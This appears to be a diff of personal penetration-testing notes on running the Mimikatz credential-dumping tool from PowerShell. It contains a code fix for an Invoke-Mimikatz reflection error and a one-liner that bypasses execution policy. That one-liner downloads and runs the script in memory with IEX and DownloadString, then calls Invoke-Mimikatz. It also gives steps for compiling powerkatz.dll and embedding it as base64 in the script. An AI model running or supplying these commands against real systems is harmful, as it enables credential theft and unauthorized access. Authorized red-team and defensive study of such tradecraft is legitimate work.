@@ -1,4 +1,5 @@
 ------------------------------------------------------------------------------------------------------------------------------------
+
 To solve the mimikatz error: 
 
 Exception calling "GetMethod" with "1" argument(s): "Ambiguous match found."
@@ -14,10 +15,19 @@ $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
 To
 
 $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
+
 ------------------------------------------------------------------------------------------------------------------------------------
+
 Mimikatz powershell one liner:
 Enter the commands into powershell:
 powershell -ep bypass #Bypass powershell execution policy
 IEX (New-Object Net.WebClient)DownloadString('path-to-invoke-mimikatz.ps1')    #loads script into memory
 Invoke-Mimikatz    #run
+
+------------------------------------------------------------------------------------------------------------------------------------
+
+Sidenote: if you want to compile the newest version of Mimikatz for PowerSploit’s Invoke-Mimikatz, just grab Benjamin’s source code - https://github.com/gentilkiwi/mimikatz, open it up in Visual Studio, select the “Second_Release_PowerShell” target option and compile for both Win32 and x64.
+
+Then transform the resulting powerkatz.dlls to a base64 string using "base64 -w 0 powerkatz.dll" in Linux. You can now replace the $PEBytes32 and $PEBytes64 strings at the bottom of Invoke-Mimikatz.ps1. Empire keeps a separately updated version of Invoke-Mimikatz with a few additional tweaks.
+
 ------------------------------------------------------------------------------------------------------------------------------------
